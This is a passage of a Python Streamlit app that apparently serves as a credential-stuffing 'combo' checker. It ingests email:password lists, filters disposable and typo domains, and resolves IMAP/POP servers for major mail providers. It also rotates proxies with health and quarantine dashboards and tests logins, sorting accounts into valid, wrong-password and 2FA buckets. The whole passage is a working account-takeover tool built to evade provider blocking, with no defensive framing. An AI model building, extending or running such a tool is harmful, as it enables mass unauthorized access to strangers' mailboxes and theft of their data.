                all_raw.extend(OXYLABS_PROXIES)
                all_raw = list(dict.fromkeys(all_raw))

                alive = []
                if all_raw:
                    clear_tunnel_cache()
                    try:
                        with ThreadPoolExecutor(max_workers=16) as ex:
                            f2p = {ex.submit(precheck_proxy_fast, p): p for p in all_raw}
                            for fut in as_completed(f2p, timeout=max(60, len(all_raw) * 2)):
                                try:
                                    if fut.result():
                                        alive.append(f2p[fut])
                                except Exception:
                                    continue
                    except Exception as e:
                        warnings.warn(f"Proxy test batch error: {e}")
                        alive = all_raw[:20]

                alive = list(dict.fromkeys(alive)) or all_raw[:20]

                try:
                    with file_write_lock:
                        with open(CFG["PROXY_FILE"], "w", encoding="utf-8") as f:
                            f.write("\n".join(str(i) for i in alive) + ("\n" if alive else ""))
                    save_proxy_meta()
                    log_startup(f"Proxy fetch & test complete. Saved {len(alive)} operational proxies.")
                except Exception as ex:
                    str_lit.error(f"Failed to write proxies file: {ex}")

            str_lit.success(f"Success! Saved {len(alive)} operational proxies.")
            str_lit.rerun()

    with str_lit.expander("📊 Proxy Health & Geo Dashboard", expanded=False):
        with probe_stats_lock:
            _pstats = dict(probe_stats)
        if proxy_meta:
            rows = []
            for p_str, meta in proxy_meta.items():
                info = parse_proxy(p_str)
                _ps = _pstats.get(p_str) or {}
                if _ps:
                    _rlabel = _PROBE_REASON_LABEL.get(_ps.get("reason", ""), _ps.get("reason", ""))
                    _age = f"{int(time.time() - _ps.get('ts', time.time()))}s ago"
                    _last = f"{_rlabel} · {_age}"
                else:
                    _last = "—"
                rows.append({
                    "Proxy": f"{info['host']}:{info['port']}" if info else "Unknown",
                    "User": (info.get("user") if info else "") or "",
                    "Latency": f"{meta.get('latency_ms', 'N/A')} ms",
                    "Country": meta.get("country", "Unknown"),
                    "Region": meta.get("region", "Unknown"),
                    "Score": meta.get("score", 50),
                    "Fails": meta.get("fails", 0),
                    "Successes": meta.get("success", 0),
                    "407s": _proxy_407.get(p_str, 0),
                    "Attempts": _ps.get("attempts", 0),
                    "Last Probe": _last,
                    "Last Error": (_ps.get("error", "") or "")[:110],
                    "Quarantined": "yes" if proxy_is_quarantined(p_str) else "",
                })
            str_lit.caption(
                f"Probe target {CFG.get('PROBE_TARGET', PROBE_TARGET_DEFAULT)} · "
                f"budget {probe_timeout():.0f}s · strict={CFG.get('PROBE_STRICT', True)} · "
                f"dedupe={CFG.get('DEDUPE_PROXIES', True)}"
            )
            str_lit.dataframe(pd.DataFrame(rows), use_container_width=True)
            col_ref1, col_ref2, col_ref3, col_ref4 = str_lit.columns(4)
            with col_ref1:
                if str_lit.button("🔄 Refresh Dashboard"):
                    str_lit.rerun()
            with col_ref2:
                if str_lit.button("🔁 Re-probe All"):
                    clear_tunnel_cache()
                    refresh_alive_pool()
                    str_lit.success("Re-probed.")
                    str_lit.rerun()
            with col_ref3:
                if str_lit.button("🧹 Clean Dead / Low-Score"):
                    with proxy_lock:
                        for k, m in list(proxy_meta.items()):
                            if m.get("score", 50) < 5 or m.get("fails", 0) >= 10:
                                proxy_meta.pop(k, None)
                    save_proxy_meta()
                    str_lit.success("Cleaned!")
                    str_lit.rerun()
            with col_ref4:
                if str_lit.button("♻️ Lift 407 Quarantine"):
                    clear_proxy_quarantine()
                    str_lit.success("Quarantine lifted.")
                    str_lit.rerun()
        else:
            str_lit.info("No proxy metadata recorded yet.")

    with str_lit.expander("🔬 Deep Diagnostics — copy/paste this to debug", expanded=False):
        str_lit.caption(
            "Everything needed to diagnose the pool remotely. Copy the whole block "
            "(hover it → copy icon) and paste it back. It includes raw proxies.txt lines, "
            "so proxy credentials are visible."
        )
        _diag = build_diagnostics_text()

        _dc1, _dc2, _dc3 = str_lit.columns(3)
        with _dc1:
            if str_lit.button("🔁 Rebuild", use_container_width=True):
                str_lit.rerun()
        with _dc2:
            if str_lit.button("🧪 Direct self-test", use_container_width=True):
                with str_lit.spinner("Running direct self-test…"):
                    _probe_target_reachability(force=True)
                    _lines = [f"self-test {datetime.now().strftime('%H:%M:%S')}"]
                    for r in _probe_target_reachability(force=True):
                        _lines.append(f"  direct {r['target']}: {'OK' if r['ok'] else 'FAIL'} "
                                      f"{r['ms']}ms resolved={r.get('resolved')} {r['err']}")
                    if alive_pool:
                        _one = alive_pool[0]
                        _res = tunnel_probe(_one)
                        _lines.append(f"  tunnel via {_one}: ok={_res['ok']} reason={_res['reason']} "
                                      f"lat={_res['latency_ms']}ms err={_res.get('error','')}")
                    else:
                        _lines.append("  tunnel: no alive node to test")
                    STATE["selftest"] = {"ts": time.time(), "text": "\n".join(_lines)}
                str_lit.success("Self-test done.")
        with _dc3:
            str_lit.download_button(
                "⬇️ Download bundle", data=_diag,
                file_name=f"diag_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt",
                mime="text/plain", use_container_width=True,
            )

        _st = STATE.get("selftest") or {}
        if _st.get("text"):
            str_lit.markdown("**Last self-test:**")
            str_lit.code(_st["text"], language="text")

        str_lit.code(_diag, language="text")

# ============================================================================
# PRE-FILTER ENGINE
# ============================================================================
DISPOSABLE = {
    "tempmail.com", "temp-mail.org", "guerrillamail.com", "guerrillamail.org",
    "10minutemail.com", "10minutemail.net", "mailinator.com", "maildrop.cc",
    "yopmail.com", "yopmail.fr", "trashmail.com", "trashmail.me",
    "getnada.com", "throwawaymail.com", "fakeinbox.com", "sharklasers.com",
    "grr.la", "guerrillamailblock.com", "pokemail.net", "spam4.me",
    "dispostable.com", "mailnesia.com", "tempail.com", "emailondeck.com",
    "mohmal.com", "tempinbox.com", "mailcatch.com", "mailnull.com",
    "spamgourmet.com", "mytemp.email", "tmpmail.org", "tmpmail.net",
    "temp-mail.io", "1secmail.com", "1secmail.org", "1secmail.net",
}
COMMON_TYPOS = {
    "gmai.com", "gamil.com", "gmal.com", "gmial.com", "g-mail.com",
    "outloo.com", "outlok.com", "hotmial.com", "hotmai.com", "hotmali.com",
    "yaho.com", "yahooo.com", "yhoo.com", "iclound.com", "ezweb.ne",
}
STRICT_APP_PROVIDERS = STRICT_APP
ZERO_ACCESS_PROVIDERS = ZERO_ACCESS
EMAIL_REGEX = re.compile(r"^[\w\.-]+@[\w\.-]+\.\w+$")
DISPOSABLE_EXTRA = {"rerttymail.com", "tmpmail.org", "tmpmail.net", "tempmailo.com"}
DISPOSABLE_FILE = "disposable_domains.txt"

def load_disposable_set():
    found = set(DISPOSABLE) | set(DISPOSABLE_EXTRA)
    if os.path.exists(DISPOSABLE_FILE):
        try:
            with open(DISPOSABLE_FILE, encoding="utf-8", errors="ignore") as f:
                found.update(x.strip().lower() for x in f if x.strip() and not x.startswith("#"))
        except Exception:
            pass
    if requests and len(found) < 500:
        try:
            r = requests.get(
                "https://raw.githubusercontent.com/disposable-email-domains/disposable-email-domains/master/disposable_email_blocklist.conf",
                timeout=8)
            if r.ok and r.text:
                found.update(x.strip().lower() for x in r.text.splitlines() if x.strip() and not x.startswith("#"))
                with open(DISPOSABLE_FILE, "w", encoding="utf-8") as f:
                    f.write("\n".join(sorted(found)))
                log_startup(f"Disposable blocklist loaded: {len(found)}")
        except Exception as e:
            log_startup(f"Disposable list fetch skipped: {e}")
    return found

DISPOSABLE_LIVE = load_disposable_set()

def is_disposable(email):
    try:
        domain = email.split("@")[-1].lower().strip()
        if domain in DISPOSABLE_LIVE or domain in DISPOSABLE_EXTRA:
            return True
        return any(p in domain for p in ("tempmail", "rerttymail", "mailinator", "yopmail", "guerrilla", "throwaway", "10minute"))
    except Exception:
        return False

def list_unfinished_runs():
    runs = []
    try:
        os.makedirs("mail_results", exist_ok=True)
        for path in sorted(glob.glob("mail_results/unfinished_*.json"), reverse=True):
            try:
                with open(path, encoding="utf-8") as f:
                    data = json.load(f)
                data["file"] = path
                runs.append(data)
            except Exception:
                continue
    except Exception:
        pass
    return runs

def save_unfinished(reason, remaining, checked, total):
    os.makedirs("mail_results", exist_ok=True)
    path = "mail_results/unfinished_live.json"
    with open(path, "w", encoding="utf-8") as f:
        json.dump({"id": "live", "reason": reason, "checked": checked, "total": total,
                   "remaining": remaining, "saved_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}, f)
    return path

def clear_unfinished():
    path = "mail_results/unfinished_live.json"
    if os.path.exists(path):
        os.remove(path)

def check_domain_resolvable(domain, persist=True):
    with cache_lock:
        if domain in domain_cache and "resolvable" in domain_cache[domain]:
            return domain_cache[domain]["resolvable"]
    resolvable = False
    try:
        if dns:
            try:
                if dns.resolver.resolve(domain, "MX"):
                    resolvable = True
            except Exception:
                try:
                    if dns.resolver.resolve(domain, "A"):
                        resolvable = True
                except Exception:
                    pass
        if not resolvable:
            socket.gethostbyname(domain)
            resolvable = True
    except Exception:
        resolvable = False
    with cache_lock:
        domain_cache.setdefault(domain, {})["resolvable"] = resolvable
    if persist:
        save_domain_cache()
    return resolvable

def load_previous_valid():
    seen = set()
    try:
        paths = sorted(glob.glob("mail_results/valid_*.txt"), reverse=True)
        for extra in ("valid_accounts.txt", "clean_valid_accounts.txt"):
            if os.path.exists(extra):
                paths.append(extra)
        for path in paths:
            try:
                with open(path, encoding="utf-8", errors="ignore") as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith("#") and ":" in line:
                            email = line.split(":", 1)[0].strip().lower()
                            if email and "@" in email:
                                seen.add(email)
            except Exception:
                continue
        log_startup(f"Loaded {len(seen)} previously validated unique email accounts.")
    except Exception as e:
        log_startup(f"WARNING: Error loading previous valid accounts: {e}")
    return seen

def _domains_in_text(text):
    out = []
    for line in (text or "").splitlines():
        line = line.strip()
        if not line or line.startswith("#") or ":" not in line:
            continue
        em = line.split(":", 1)[0].strip().lower()
        if "@" in em:
            d = em.split("@")[-1]
            if d and d not in out:
                out.append(d)
    return out

def process_accounts(text, previous_valid):
    lines = []
    disp_list, typo_list, resume_list, app_skip_list, custom_list = [], [], [], [], []
    dns_fail_list, smtp_fail_list = [], []
    whitelist = CFG.get("CUSTOM_WHITELIST", [])
    blacklist = CFG.get("CUSTOM_BLACKLIST", [])

    for line in text.splitlines():
        line = line.strip().lstrip('\ufeff').strip('"').strip("'").strip()
        if not line or line.startswith("#") or ":" not in line:
            continue
        parts = line.split(":", 1)
        email = parts[0].strip().lower()
        password = parts[1].strip() if len(parts) > 1 else ""
        if not email or "@" not in email or not password:
            continue
        if CFG.get("FAST_MODE", True) and not EMAIL_REGEX.match(email):
            continue
        domain = email.split("@")[-1].lower()
        if whitelist and domain not in whitelist:
            custom_list.append(line); continue
        if blacklist and domain in blacklist:
            custom_list.append(line); continue
        if CFG.get("SKIP_STRICT_APP_PROVIDERS", False) and domain in STRICT_APP_PROVIDERS:
            app_skip_list.append(line); continue
        if is_disposable(email):
            disp_list.append(line); continue
        if domain in COMMON_TYPOS:
            typo_list.append(line); continue
        if email in previous_valid:
            resume_list.append(line); continue
        if ".." in email or email.count("@") != 1:
            continue
        if not check_domain_resolvable(domain, persist=False):
            dns_fail_list.append(line); continue
        lines.append(f"{email}:{password}")

    save_domain_cache()

    if CFG.get("SMTP_CHECK", False) and lines:
        domains = list(dict.fromkeys(l.split(":", 1)[0].split("@")[-1].lower() for l in lines if "@" in l))
        results = smtp_precheck_domains(domains)
        keep = []
        for l in lines:
            d = l.split(":", 1)[0].split("@")[-1].lower()
            if results.get(d) is False:
                smtp_fail_list.append(l)
            else:
                keep.append(l)
        lines = keep
        dead = sum(1 for v in results.values() if v is False)
        log_startup(f"SMTP pre-check: {len(results)} domain(s) probed, {dead} dead, {len(smtp_fail_list)} account(s) bucketed.")

    seen_email, clean = set(), []
    for line in lines:
        em = line.split(":", 1)[0].strip().lower()
        if em not in seen_email:
            seen_email.add(em)
            clean.append(line)

    log_startup(
        f"Processed account input. Clean valid count ready: {len(clean)} "
        f"(Filtered DNS failures: {len(dns_fail_list)}, SMTP failures: {len(smtp_fail_list)})"
    )
    return clean, disp_list, typo_list, resume_list, app_skip_list, custom_list, dns_fail_list, smtp_fail_list

# --- Main Input Section ---
section_title("📥", "Accounts Input & Pre-Filtering", "paste combos or upload a file — junk is filtered before the engine runs")

input_tab1, input_tab2 = str_lit.tabs(["📝 Paste Combos", "📁 Upload Combo File"])
raw_text = ""
with input_tab1:
    raw_text = str_lit.text_area("Paste accounts here (email:password format):", placeholder="user@example.com:password123", height=150)
with input_tab2:
    uploaded_file = str_lit.file_uploader("Upload .txt combo file", type=["txt"])
    if uploaded_file is not None:
        try:
            file_bytes = uploaded_file.getvalue()
            if not file_bytes:
                str_lit.warning("Uploaded file is empty.")
                raw_text = ""
            else:
                try:
                    raw_text = file_bytes.decode("utf-8", errors="ignore")
                except Exception:
                    raw_text = file_bytes.decode("latin-1", errors="ignore")
                str_lit.success("File uploaded successfully!")
        except Exception as e:
            str_lit.error(f"Failed decoding uploaded file: {e}")
            raw_text = ""

PREFILTER_LABELS = [
    "Ready to Check", "Resume Unfinished", "Disposables", "Typos",
    "Skip previously valid", "App-Skipped", "Custom Filtered",
    "DNS Failed", "SMTP Failed",
]

clean_lines = []
disp, typo, resume, app_skip, custom_skipped, dns_skipped, smtp_skipped = [], [], [], [], [], [], []
skip_previous = str_lit.checkbox("Skip previously valid", value=True, help="On: lines already in old valid files are not checked again.")

if raw_text:
    previous_valid = load_previous_valid() if skip_previous else set()

    _pending_smtp = ([d for d in _domains_in_text(raw_text) if not smtp_cached(d)]
                     if CFG.get("SMTP_CHECK", False) else [])
    if _pending_smtp:
        with str_lit.spinner(f"🛰 SMTP reachability pre-check on {len(_pending_smtp)} new domain(s)…"):
            (clean_lines, disp, typo, resume, app_skip,
             custom_skipped, dns_skipped, smtp_skipped) = process_accounts(raw_text, previous_valid)
    else:
        (clean_lines, disp, typo, resume, app_skip,
         custom_skipped, dns_skipped, smtp_skipped) = process_accounts(raw_text, previous_valid)

    str_lit.session_state.pre_dns_failed = list(dns_skipped)
    str_lit.session_state.pre_smtp_failed = list(smtp_skipped)

    unfinished_count = len(list_unfinished_runs())
    cols = str_lit.columns(9)
    for c, (lbl, val) in zip(cols, [
        ("Ready to Check", len(clean_lines)),
        ("Resume Unfinished", unfinished_count),
        ("Disposables", len(disp)),
        ("Typos", len(typo)),
        ("Skip previously valid", len(resume)),
        ("App-Skipped", len(app_skip)),
        ("Custom Filtered", len(custom_skipped)),
        ("DNS Failed", len(dns_skipped)),
        ("SMTP Failed", len(smtp_skipped)),
    ]):
        c.metric(lbl, val)

    section_title("🔍", "Filter & Result Categories Inspector",
                  "inspect any bucket, including DNS Failed and SMTP Failed")

    RESULT_INSPECT = [
        ("✅ Valid Found", "valid_results"),
        ("❌ Wrong Password Found", "wrong_results"),
        ("🔐 App Password / 2FA Found", "need_app_results"),
        ("🕓 RETRY_LATER Found", "retry_results"),
        ("🚫 RBL Blocked Found", "rbl_results"),
        ("🔌 Connection Failed Found", "conn_results"),
        ("🩹 Proxy Unhealthy Found", "proxy_results"),
    ]

    inspect_options = list(PREFILTER_LABELS) + [label for label, _ in RESULT_INSPECT]

    filter_category_choice = str_lit.selectbox("Select category to inspect contents:", options=inspect_options)

    unfinished_preview = []
    for run in list_unfinished_runs():
        unfinished_preview.append(f"{run.get('saved_at','')} | {run.get('reason','')} | left {len(run.get('remaining') or [])}")
        unfinished_preview.extend(run.get("remaining") or [])

    category_map = {
        "Ready to Check": clean_lines,
        "Resume Unfinished": unfinished_preview,
        "Disposables": disp,
        "Typos": typo,
        "Skip previously valid": resume,
        "App-Skipped": app_skip,
        "Custom Filtered": custom_skipped,
        "DNS Failed": dns_skipped,
        "SMTP Failed": smtp_skipped,
    }
    _label_to_key = dict(RESULT_INSPECT)
    if filter_category_choice in _label_to_key:
        category_map[filter_category_choice] = list(str_lit.session_state.get(_label_to_key[filter_category_choice], []))

    selected_list_items = category_map.get(filter_category_choice, [])
    if selected_list_items:
        str_lit.info(f"Showing **{len(selected_list_items)}** items for **{filter_category_choice}**:")
        str_lit.code("\n".join(str(i) for i in selected_list_items), language="text")
    else:
        str_lit.info(f"No items in **{filter_category_choice}**.")

# ============================================================================
# PROVIDER TABLES / HOST RESOLUTION
# ============================================================================
PROVIDER_MAP = {
    "gmail.com": {"imap": ["imap.gmail.com", "mail.gmail.com"], "pop": ["pop.gmail.com"], "pop3": ["pop.gmail.com"]},
    "googlemail.com": {"imap": ["imap.gmail.com", "mail.gmail.com"], "pop": ["pop.gmail.com"], "pop3": ["pop.gmail.com"]},
    "outlook.com": {"imap": ["outlook.office365.com", "mail.outlook.com"], "pop": ["outlook.office365.com"], "pop3": ["outlook.office365.com"]},
    "hotmail.com": {"imap": ["outlook.office365.com", "mail.hotmail.com"], "pop": ["outlook.office365.com"], "pop3": ["outlook.office365.com"]},
    "live.com": {"imap": ["outlook.office365.com", "mail.live.com"], "pop": ["outlook.office365.com"], "pop3": ["outlook.office365.com"]},
    "yahoo.com": {"imap": ["imap.mail.yahoo.com", "mail.yahoo.com"], "pop": ["pop.mail.yahoo.com"], "pop3": ["pop.mail.yahoo.com"]},
    "btinternet.com": {"imap": ["imap.mail.yahoo.com"], "pop": ["pop.mail.yahoo.com"], "pop3": ["pop.mail.yahoo.com"]},
    "bt.com": {"imap": ["imap.mail.yahoo.com"], "pop": ["pop.mail.yahoo.com"], "pop3": ["pop.mail.yahoo.com"]},
    "btopenworld.com": {"imap": ["imap.mail.yahoo.com"], "pop": ["pop.mail.yahoo.com"], "pop3": ["pop.mail.yahoo.com"]},
    "talk21.com": {"imap": ["imap.mail.yahoo.com"], "pop": ["pop.mail.yahoo.com"], "pop3": ["pop.mail.yahoo.com"]},
    "sky.com": {"imap": ["imap.tools.sky.com"], "pop": ["imap.tools.sky.com"], "pop3": ["imap.tools.sky.com"]},
    "virginmedia.com": {"imap": ["imap.virginmedia.com"], "pop": ["imap.virginmedia.com"], "pop3": ["imap.virginmedia.com"]},
    "ntlworld.com": {"imap": ["imap.virginmedia.com"], "pop": ["imap.virginmedia.com"], "pop3": ["imap.virginmedia.com"]},
    "blueyonder.co.uk": {"imap": ["imap.virginmedia.com"], "pop": ["imap.virginmedia.com"], "pop3": ["imap.virginmedia.com"]},
    "icloud.com": {"imap": ["imap.mail.me.com", "mail.icloud.com"], "pop": ["pop.mail.me.com"], "pop3": ["pop.mail.me.com"]},
    "naver.com": {"imap": ["imap.naver.com", "mail.naver.com"], "pop": ["pop.naver.com"], "pop3": ["pop.naver.com"]},
    "qq.com": {"imap": ["imap.qq.com", "mail.qq.com"], "pop": ["pop.qq.com"], "pop3": ["pop.qq.com"]},
}
PUBLIC_PROVIDERS = set(PROVIDER_MAP.keys())
PARENT_PROVIDER_MAPPINGS = PARENT

def get_mx_hosts(domain):
    if not dns:
        return []
    try:
        return [str(r.exchange).lower().rstrip(".") for r in sorted(dns.resolver.resolve(domain, "MX"), key=lambda x: x.preference)]
    except Exception:
        return []

def detect_parent_provider(domain):
    if domain in PARENT_PROVIDER_MAPPINGS:
        return PARENT_PROVIDER_MAPPINGS[domain]
    for m in get_mx_hosts(domain):
        ml = m.lower()
        if "biglobe" in ml:
            return "biglobe.ne.jp"
        if "google" in ml or "gmail" in ml:
            return "gmail.com"
        if "outlook" in ml or "protection.outlook" in ml:
            return "outlook.office365.com"
        if "yahoo" in ml:
            return "yahoo.com"
    return None

def _location_tokens_from_mx(mx_records, domain):
    toks = []
    for mx in (mx_records or [])[:3]:
        for part in re.split(r"[.\-]", mx or ""):
            p = part.strip().lower()
            if not p or p in toks or p in domain or p in ("com", "net", "org", "edu", "gov", "co", "mail"):
                continue
            if re.match(r"^(mx|mta|smtp|relay|inbound|outbound|zcs|srv|edge|filter|cluster|mailrouter)\d*$", p):
                continue
            toks.append(p)
    return toks[:1]

def _expand_cnames(hosts, limit=6):
    if not dns:
        return list(hosts)
    out = []
    for h in hosts:
        if h not in out:
            out.append(h)
        if len(out) >= limit:
            break
        try:
            for r in dns.resolver.resolve(h, "CNAME", lifetime=2):
                t = str(r.target).rstrip(".").lower()
                if t and t not in out:
                    out.append(t)
        except Exception:
            pass
    return out

def generate_candidate_hosts(domain: str, mx_records: list = None) -> list:
    candidates = []
    dl = domain.lower()
    if "charter" in dl:
        candidates.extend(["mobile.charter.net", "imap.charter.net", "mail.charter.net"])
    elif "spectrum" in dl:
        candidates.extend(["imap.spectrum.net", "mail.spectrum.net"])
    elif "twc" in dl:
        candidates.extend(["mail.twc.com"])

    for prefix in ['imap', 'mail', 'webmail', 'imaps', 'correo', 'secure', 'email']:
        candidates.append(f"{prefix}.{domain}")

    for tok in _location_tokens_from_mx(mx_records, domain):
        for prefix in ['mail', 'imap', 'pop3', 'pop']:
            candidates.append(f"{prefix}-{tok}.{domain}")

    candidates.append(domain)

    for mx in (mx_records or []):
        candidates.append(mx)
        parts = mx.split('.')
        if len(parts) >= 2:
            parent = f"{parts[-2]}.{parts[-1]}"
            if parent != domain:
                for prefix in ['imap', 'mail', 'pop', 'pop3']:
                    candidates.append(f"{prefix}.{parent}")

    return _expand_cnames(list(dict.fromkeys(candidates)))

def known_provider_conf(domain):
    return host_conf(domain)

def drop_before_check(email):
    email = (email or "").strip().lower()
    if email.count("@") != 1:
        return "bad format"
    local, domain = email.split("@", 1)
    if "http" in local or "login.live" in local or not local or "." not in domain:
        return "bad format"
    if any(p in domain for p in ("tempmail", "guerrillamail", "mailinator", "yopmail", "trashmail", "rerttymail", "10minutemail", "throwaway")):
        return "disposable"
    return ""

def host_resolves(host):
    if not host:
        return False
    with _host_dns_lock:
        cached = _host_dns_cache.get(host)
    if cached is not None:
        return cached
    ok = False
    try:
        if dns:
            try:
                dns.resolver.resolve(host, "A", lifetime=2)
                ok = True
            except Exception:
                try:
                    dns.resolver.resolve(host, "AAAA", lifetime=2)
                    ok = True
                except Exception:
                    pass
        if not ok:
            socket.gethostbyname(host)
            ok = True
    except Exception:
        ok = False
    with _host_dns_lock:
        _host_dns_cache[host] = ok
    return ok

def _is_junk_host(host, domain):
    return host_is_junk(host, domain)

def _rank_hosts(hosts, domain):
    return host_rank_hosts(hosts, domain)

_LOCAL_PRIORITY_IMAP = ("imap.", "mail.", "email.", "")
_LOCAL_PRIORITY_POP = ("pop.", "pop3.", "")

_DOMAIN_IMAP_GUESS = (
    "imap.", "mail.", "", "imap3.", "imaps.", "imap2.",
    "webmail.", "mail2.", "imap4.", "correo.", "email.", "secure.", "zimbra.",
)
_DOMAIN_POP_GUESS = (
    "pop.", "pop3.", "", "pop3s.", "mail.", "pop2.", "pop4.", "mail2.",
)

_DOMAIN_ALIAS_ROOTS = {
    "xplornet.com": ("xplore.net",),
    "xplore.net":   ("xplornet.com",),
}

def _domain_roots(domain):
    domain = (domain or "").lower().strip()
    roots = [domain] if domain else []
    for alt in _DOMAIN_ALIAS_ROOTS.get(domain, ()):
        if alt and alt not in roots:
            roots.append(alt)
    return roots

def _is_local_domain_host(host, domain):
    h = (host or "").lower().strip()
    if not h:
        return False
    for root in _domain_roots(domain):
        if h == root or h.endswith("." + root):
            return True
    return False

def _guess_candidates(domain, prefixes):
    out = []
    roots = _domain_roots(domain)
    if not roots:
        return out
    for root in roots:
        for pfx in prefixes:
            cand = f"{pfx}{root}" if pfx else root
            if cand and cand not in out and host_resolves(cand):
                out.append(cand)
    return out

def _is_plain_domain_guess(host, domain, prefixes):
    h = (host or "").lower().strip()
    d = (domain or "").lower().strip()
    if not h or not d:
        return False
    if h == d:
        return True
    return any(h == f"{p}{d}" for p in prefixes if p)

def _family_priority(domain):
    """Curated family endpoint for this domain (delegates to hosts.py)."""
    if _HAVE_HOSTS_MERGE:
        try:
            return _hosts_family_priority(domain)
        except Exception:
            pass
    return []

def _merge_domain_guesses(servers, domain):
    """v13.25: delegate to hosts.py so FAMILY_PRIORITY is honoured."""
    if _HAVE_HOSTS_MERGE:
        try:
            return _hosts_merge_guesses(servers, domain)
        except Exception:
            pass
    if not servers or not domain:
        return servers

    out = dict(servers)
    for key, priority in (("imap", _LOCAL_PRIORITY_IMAP),
                          ("pop", _LOCAL_PRIORITY_POP),
                          ("pop3", _LOCAL_PRIORITY_POP)):
        hosts = [h for h in (out.get(key) or []) if h]
        if not hosts:
            continue

        family = _family_priority(domain)
        local_priority = _guess_candidates(domain, priority)
        priority_set = set(local_priority) | set(family)

        local_other = [h for h in hosts
                       if h not in priority_set and _is_local_domain_host(h, domain)]
        local_other_set = set(local_other)

        foreign = [h for h in hosts
                   if h not in priority_set and h not in local_other_set]

        merged = []
        for h in family + local_priority + local_other + foreign:
            if h and h not in merged:
                merged.append(h)
        out[key] = merged
    return out

def get_servers(email):
    try:
        domain = email.split("@")[-1].lower().strip()
        if domain in ZERO_ACCESS_PROVIDERS:
            return {"imap": [], "pop": [], "pop3": [], "type": "zero_access"}

        known = known_provider_conf(domain)
        if known:
            if known.get("imap"):
                known["imap"] = _rank_hosts(known["imap"], domain)
            if known.get("pop"):
                known["pop"] = _rank_hosts(known["pop"], domain)
            return _merge_domain_guesses(known, domain)

        with cache_lock:
            cached = domain_cache.get(domain) or {}
        if cached.get("imap") and (time.time() - float(cached.get("ts", 0))) < DOMAIN_CACHE_TTL:
            return _merge_domain_guesses({
                "imap": list(cached["imap"]),
                "pop": list(cached.get("pop") or cached["imap"]),
                "pop3": list(cached.get("pop3") or cached["imap"]),
            }, domain)

        parent_domain = detect_parent_provider(domain)
        if parent_domain in ("yahoo.com", "gmail.com"):
            res = _merge_domain_guesses(known_provider_conf(parent_domain), domain)
            if res:
                return res
        if parent_domain == "outlook.office365.com":
            res = _merge_domain_guesses(known_provider_conf("outlook.com"), domain)
            if res:
                return res
        if parent_domain == "biglobe.ne.jp":
            return _merge_domain_guesses(
                {"imap": ["mail.biglobe.ne.jp"], "pop": ["mail.biglobe.ne.jp"], "pop3": ["mail.biglobe.ne.jp"]}, domain)

        if domain in PROVIDER_MAP:
            return _merge_domain_guesses(PROVIDER_MAP[domain], domain)

        mx_records = get_mx_hosts(domain) if parent_domain not in PARENT_PROVIDER_MAPPINGS else []
        candidate_hosts = _rank_hosts(generate_candidate_hosts(domain, mx_records), domain)
        servers = {"imap": candidate_hosts, "pop": candidate_hosts, "pop3": candidate_hosts}

        with cache_lock:
            domain_cache.setdefault(domain, {})
            domain_cache[domain].update({
                "imap": servers["imap"], "pop": servers["pop"], "pop3": servers["pop3"],
                "ts": time.time(),
            })
        save_domain_cache()
        return _merge_domain_guesses(servers, domain)
    except Exception as e:
        warnings.warn(f"Error resolving servers for {email}: {e}")
        d = email.split('@')[-1] if '@' in email else 'localhost'
        fp = generate_candidate_hosts(d, [])
        return _merge_domain_guesses({"imap": fp, "pop": fp, "pop3": fp}, d)

# ============================================================================
# ATTEMPT HELPERS
# ============================================================================

def username_candidates(email):
    email = (email or "").strip()
    if not email:
        return [email]
    out = [email]
    if "@" in email:
        local = email.split("@", 1)[0].strip()
        if local and local.lower() != email.lower():
            out.append(local)
    return list(dict.fromkeys(out))

def imap_once(email, password, server, proxy_str=None, insecure=True, port=993, attempt_timeout=None):
    to = attempt_timeout or CFG["TIMEOUT"]
    mail = None
    try:
        mail = ProxyIMAP4SSL(server, port, timeout=to, proxy_str=proxy_str, insecure=insecure)
        typ, data = mail.login(email.strip(), password.strip())
        if typ != 'OK':
            raise RuntimeError(f"IMAP login returned non-OK status: {typ} {data}")
        st_typ, st_data = mail.select("INBOX", readonly=True)
        if st_typ != 'OK':
            raise RuntimeError(f"IMAP post-auth inbox select failed (possible proxy spoofing): {st_typ} {st_data}")
        try:
            mail.noop()
        except Exception:
            pass
    finally:
        if mail:
            try:
                mail.logout()
            except Exception:
                pass

def imap_starttls_once(email, password, server, proxy_str=None, insecure=True, port=143, attempt_timeout=None):
    to = attempt_timeout or CFG["TIMEOUT"]
    mail = None
    try:
        mail = ProxyIMAP4(server, port, timeout=to, proxy_str=proxy_str)
        mail.starttls(ssl_context=_tls_context(server, verify=not insecure))
        typ, data = mail.login(email.strip(), password.strip())
        if typ != 'OK':
            raise RuntimeError(f"IMAP STARTTLS login returned non-OK status: {typ} {data}")
        st_typ, st_data = mail.select("INBOX", readonly=True)
        if st_typ != 'OK':
            raise RuntimeError(f"IMAP STARTTLS post-auth inbox select failed: {st_typ} {st_data}")
        try:
            mail.noop()
        except Exception:
            pass
    finally:
        if mail:
            try:
                mail.logout()
            except Exception:
                pass

def imap_plain_once(email, password, server, proxy_str=None, port=143, attempt_timeout=None):
    to = attempt_timeout or CFG["TIMEOUT"]
    mail = None
    try:
        mail = ProxyIMAP4(server, port, timeout=to, proxy_str=proxy_str)
        typ, data = mail.login(email.strip(), password.strip())
        if typ != 'OK':
            raise RuntimeError(f"IMAP plain login returned non-OK status: {typ} {data}")
        st_typ, st_data = mail.select("INBOX", readonly=True)
        if st_typ != 'OK':
            raise RuntimeError(f"IMAP plain post-auth inbox select failed: {st_typ} {st_data}")
        try:
            mail.noop()
        except Exception:
            pass
    finally:
        if mail:
            try:
                mail.logout()
            except Exception:
                pass

def pop_once(email, password, server, proxy_str=None, insecure=True, port=995, attempt_timeout=None):
    to = attempt_timeout or CFG["TIMEOUT"]
    mail = None
    try:
        mail = ProxyPOP3SSL(server, port, timeout=to, proxy_str=proxy_str, insecure=insecure)
        if not pop3_ok(mail.getwelcome()):
            raise RuntimeError("POP3 invalid welcome banner")
        if not pop3_ok(mail.user(email.strip())):
            raise RuntimeError("POP3 user rejected")
        if not pop3_ok(mail.pass_(password.strip())):
            raise RuntimeError("POP3 password rejected")
        if not pop3_ok(mail.stat()):
            raise RuntimeError("POP3 post-auth stat failed (possible proxy spoofing)")
        try:
            mail.noop()
        except Exception:
            pass
    finally:
        if mail:
            try:
                mail.quit()
            except Exception:
                pass

def pop_starttls_once(email, password, server, proxy_str=None, insecure=True, port=110, attempt_timeout=None):
    to = attempt_timeout or CFG["TIMEOUT"]
    mail = None
    try:
